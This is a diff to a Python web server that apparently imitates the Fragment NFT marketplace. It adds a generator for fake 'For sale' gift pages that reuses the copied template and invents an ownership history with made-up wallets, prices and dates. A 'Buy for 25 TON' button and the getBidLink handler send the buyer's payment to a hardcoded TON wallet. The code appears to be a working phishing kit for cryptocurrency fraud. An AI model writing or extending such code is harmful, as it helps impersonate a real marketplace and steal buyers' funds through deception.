@@ -210,6 +210,150 @@ FOR_SALE_END_DATES = {
     "otctelegram":  "2026-06-25T21:00:00+00:00",
 }
 
+FOR_SALE_GIFTS = {
+    "vintagecigar-16398": {"price": 25, "title": "Vintage Cigar #16398"},
+}
+
+
+def generate_gift_for_sale_page(gift_id):
+    """Generate a 'For sale' product page for a gift NFT."""
+    cfg = FOR_SALE_GIFTS.get(gift_id.lower())
+    if not cfg:
+        return None
+    price_ton = cfg["price"]
+    title = cfg["title"]
+    usd = price_ton * TON_RATE
+    usd_str = f"~ ${usd:.0f}"
+    price_str = str(price_ton)
+    slug = gift_id.lower()          # vintageCigar-16398
+    img_slug = "vintagecigar-15623"  # reuse existing image
+
+    with open("html/page_gift.html", "r", encoding="utf-8", errors="ignore") as f:
+        content = f.read()
+
+    # --- Basic replacements (image path FIRST before general slug replacement) ---
+    content = apply_dynamic_replacements(content, [
+        ("/images/plushpepe-1821.medium.jpg", f"/images/{img_slug}.medium.jpg"),
+        ("plushpepe-1821",              slug),
+        ("Plush Pepe #1821",            title),
+        ("Plush Pepe&nbsp;#1821",       title),
+        ("ccccc \u2013\xa0Fragment",    f"{title} \u2013\xa0Fragment"),
+        ("ccccc \u2013 Fragment",       f"{title} \u2013 Fragment"),
+        ("ccccc – Fragment",            f"{title} – Fragment"),
+    ])
+
+    # --- Sale price + owner table (replaces everything up to tm-section-auction-info) ---
+    owner_full = "EQB-ua33JBqzFPrmnTRvLG38tZWXK9yREkTsc5R_aSVF231N"
+    owner_short = "EQB-ua3...F231N"
+    new_bid = (
+        '<div class="tm-section-box tm-section-bid-info">'
+        '<table class="table tm-table tm-table-fixed"><thead><tr>'
+        '<th style="--width:50%">Sale Price</th>'
+        '<th style="--width:50%">Owner</th>'
+        '</tr></thead><tbody><tr>'
+        f'<td><div class="table-cell">'
+        f'<div class="table-cell-value tm-value icon-before icon-ton">{price_str}</div>'
+        f'<div class="table-cell-desc">{usd_str}</div>'
+        '</div></td>'
+        f'<td><div class="table-cell">'
+        f'<a class="tm-wallet" href="https://tonviewer.com/{owner_full}" target="_blank">'
+        f'<span class="short">{owner_short}</span></a>'
+        '</div></td>'
+        '</tr></tbody></table>'
+        '<div class="tm-bid-info-text">'
+        'The owner of this asset is ready to sell it for this price without an auction.'
+        '</div></div>'
+    )
+    # Replace bid-info up to (but not including) the auction-info list
+    content = re.sub(
+        r'<div class="tm-section-box tm-section-bid-info">.*?(?=<div class="tm-list tm-section-box tm-section-auction-info">)',
+        new_bid + '\n    ',
+        content, flags=re.DOTALL
+    )
+    # Remove the tm-section-auction-info block (shows gift attributes like Model/Backdrop)
+    content = re.sub(
+        r'<div class="tm-list tm-section-box tm-section-auction-info">.*?(?=<div class="tm-section-box tm-section-buttons">)',
+        '',
+        content, flags=re.DOTALL
+    )
+    # Clean up any remaining stale owner/date text that may survive from the template
+    content = content.replace('collector.ton', owner_short)
+    content = content.replace('Purchased on 22 May 2026 at 12:40', '')
+    content = content.replace('May 22 at 12:40', '')
+
+    # --- Countdown (360 days) inserted before buttons ---
+    countdown_html = (
+        '\n    <div class="tm-section-box tm-section-countdown-wrap js-timer-wrap">'
+        '\n     <div class="tm-section-countdown">'
+        '\n      <span class="tm-countdown-label short">Ends in</span>'
+        '\n      <span class="tm-countdown-label full">Sale ends in</span>'
+        '\n      <time class="tm-countdown-timer" data-relative="counter" datetime="2027-05-18T12:00:00+00:00"></time>'
+        '\n     </div>'
+        '\n     <div class="tm-section-countdown-end">'
+        '\n      <span class="tm-countdown-label">Sale will close soon</span>'
+        '\n     </div>'
+        '\n    </div>\n    '
+    )
+    content = content.replace(
+        '<div class="tm-section-box tm-section-buttons">',
+        countdown_html + '<div class="tm-section-box tm-section-buttons">'
+    )
+
+    # --- Buy button ---
+    content = re.sub(
+        r'<div class="tm-section-box tm-section-buttons">.*?</div>',
+        f'<div class="tm-section-box tm-section-buttons">'
+        f'<button class="btn btn-primary js-buy-now-btn" data-bid-amount="{price_str}">'
+        f'Buy for {price_str} TON</button></div>',
+        content, flags=re.DOTALL
+    )
+
+    # --- 4-row Ownership History (target only the Ownership History section's tbody) ---
+    history_rows = (
+        '\n       <tr>'
+        '\n        <td><div class="table-cell"><div class="table-cell-value tm-value icon-before icon-ton">11</div></div></td>'
+        '\n        <td><div class="table-cell"><div class="tm-datetime"><span class="wide-only"><time>12 Jan 2026 at 09:15</time></span></div></div></td>'
+        '\n        <td><div class="table-cell"><a class="tm-wallet" href="https://tonviewer.com/" target="_blank"><span class="short">fragment.ton</span></a></div></td>'
+        '\n       </tr>'
+        '\n       <tr>'
+        '\n        <td><div class="table-cell"><div class="table-cell-value tm-value icon-before icon-ton">15</div></div></td>'
+        '\n        <td><div class="table-cell"><div class="tm-datetime"><span class="wide-only"><time>3 Mar 2026 at 14:22</time></span></div></div></td>'
+        '\n        <td><div class="table-cell"><a class="tm-wallet" href="https://tonviewer.com/" target="_blank"><span class="short">satoshi.ton</span></a></div></td>'
+        '\n       </tr>'
+        '\n       <tr>'
+        '\n        <td><div class="table-cell"><div class="table-cell-value tm-value icon-before icon-ton">20</div></div></td>'
+        '\n        <td><div class="table-cell"><div class="tm-datetime"><span class="wide-only"><time>19 Apr 2026 at 18:05</time></span></div></div></td>'
+        '\n        <td><div class="table-cell"><a class="tm-wallet" href="https://tonviewer.com/" target="_blank"><span class="short">venom.ton</span></a></div></td>'
+        '\n       </tr>'
+        '\n       <tr>'
+        '\n        <td><div class="table-cell"><div class="table-cell-value tm-value icon-before icon-ton">25</div></div></td>'
+        '\n        <td><div class="table-cell"><div class="tm-datetime"><span class="wide-only"><time>10 May 2026 at 11:30</time></span></div></div></td>'
+        f'\n        <td><div class="table-cell"><a class="tm-wallet" href="https://tonviewer.com/{owner_full}" target="_blank"><span class="short">{owner_short}</span></a></div></td>'
+        '\n       </tr>\n       '
+    )
+    # Target only the tbody inside the Ownership History section
+    content = re.sub(
+        r'(Ownership History.*?<tfoot>.*?</tfoot>\s*<tbody>).*?(</tbody>)',
+        r'\g<1>' + history_rows + r'\g<2>',
+        content, flags=re.DOTALL
+    )
+
+    # --- Fix ajInit ---
+    content = content.replace(
+        '"nftId":"plushpepe-1821"',
+        f'"nftId":"{slug}"'
+    )
+    content = content.replace(
+        '"itemTitle":"Plush Pepe #1821"',
+        f'"itemTitle":"{title}"'
+    )
+    content = content.replace(
+        '"typeUrl":"\\/gift\\/"',
+        '"typeUrl":"\\/nft\\/"'
+    )
+
+    return content
+
 
 def generate_sale_page(display_name, price_ton, end_datetime=None):
     """Generate a 'For sale' product page for a username."""
@@ -839,6 +983,14 @@ class Handler(http.server.BaseHTTPRequestHandler):
         if file_path is None and re.match(r'^/gifts/[^/]+$', path):
             file_path = "html/page_3.html"
 
+        # /nft/GiftId → for-sale gift NFT product page
+        if file_path is None and re.match(r'^/nft/[^/?]+$', path):
+            gift_id = path.split("/nft/")[1]
+            content = generate_gift_for_sale_page(gift_id)
+            if content:
+                self.serve_content(content, is_ajax)
+                return
+
         # /gift/slug or /gifts/collection/slug → dynamic gift product page
         if file_path is None and (re.match(r'^/gift/', path) or re.match(r'^/gifts/[^/]+/.+', path)):
             # Extract gift slug from the URL
@@ -1060,17 +1212,20 @@ class Handler(http.server.BaseHTTPRequestHandler):
         if method == "getBidLink":
             import time as _time
             username = params.get("username", [""])[0]
-            price_ton = FOR_SALE_USERNAMES.get(username.lower(), 20)
+            # Check usernames first, then gift NFTs
+            if username.lower() in FOR_SALE_USERNAMES:
+                price_ton = FOR_SALE_USERNAMES[username.lower()]
+            elif username in FOR_SALE_GIFTS:
+                price_ton = FOR_SALE_GIFTS[username]["price"]
+            elif username.lower() in {k.lower(): v for k, v in FOR_SALE_GIFTS.items()}:
+                price_ton = next(v["price"] for k, v in FOR_SALE_GIFTS.items() if k.lower() == username.lower())
+            else:
+                price_ton = 20
             amount_nano = str(price_ton * 1_000_000_000)
             recipient = "UQCMXMXvUvwu5bZ2ElRMW-Q-8d7zuS_OoSW32UNznQPltXTs"
             transaction = {
                 "validUntil": int(_time.time()) + 600,
-                "messages": [
-                    {
-                        "address": recipient,
-                        "amount": amount_nano,
-                    }
-                ]
+                "messages": [{"address": recipient, "amount": amount_nano}]
             }
             self.send_json({"ok": 1, "transaction": transaction})
             return
